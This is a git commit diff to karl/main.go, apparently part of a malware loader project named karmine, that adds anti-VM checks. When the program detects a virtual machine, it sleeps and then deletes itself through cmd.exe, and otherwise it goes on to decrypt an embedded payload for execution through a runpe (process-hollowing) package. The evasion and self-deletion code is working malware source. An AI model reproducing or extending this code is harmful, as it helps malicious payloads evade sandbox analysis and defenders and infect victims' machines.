564e9ca140bca80ae94b2683957b6a32a0d92afc
pygrum <pygrum.sec@gmail.com>
2023-05-18 10:36:42 +0100

    anti vm checks

--- karl/main.go
+++ karl/main.go
@@ -1,9 +1,15 @@
+//go:build windows
+// +build windows
+
 package main
 
 import (
 	_ "embed"
 	"os"
+	"syscall"
+	"time"
 
+	"github.com/ShellCode33/VM-Detection/vmdetect"
 	"github.com/pygrum/karmine/karl/runpe"
 	"github.com/pygrum/karmine/krypto/kes"
 )
@@ -19,9 +25,34 @@ var (
 var fileBytes []byte
 
 func main() {
-	/*
-		Anti-sandbox / analysis checks
-	*/
+	// VM detection checks
+	// Using external library, as checks are as simple as looking to see if paths exist, checking mac addresses, etc
+
+	// Unable to check for attached debugger, golang is incapable
+
+	if ok, _ := vmdetect.IsRunningInVirtualMachine(); ok {
+		time.Sleep(14 * time.Second)
+
+		var sI syscall.StartupInfo
+		var pI syscall.ProcessInformation
+
+		exePath, _ := os.Executable()
+
+		// self delete
+		cmd := syscall.StringToUTF16Ptr(os.Getenv("windir") + "\\system32\\cmd.exe /C del " + exePath)
+		syscall.CreateProcess(
+			nil,
+			cmd,
+			nil,
+			nil,
+			true,
+			0,
+			nil,
+			nil,
+			&sI,
+			&pI,
+		)
+	}
 	fileBytes, err := kes.DecryptObject(fileBytes, aeskey, X1, X2)
 	if err != nil {
 		os.Exit(1)
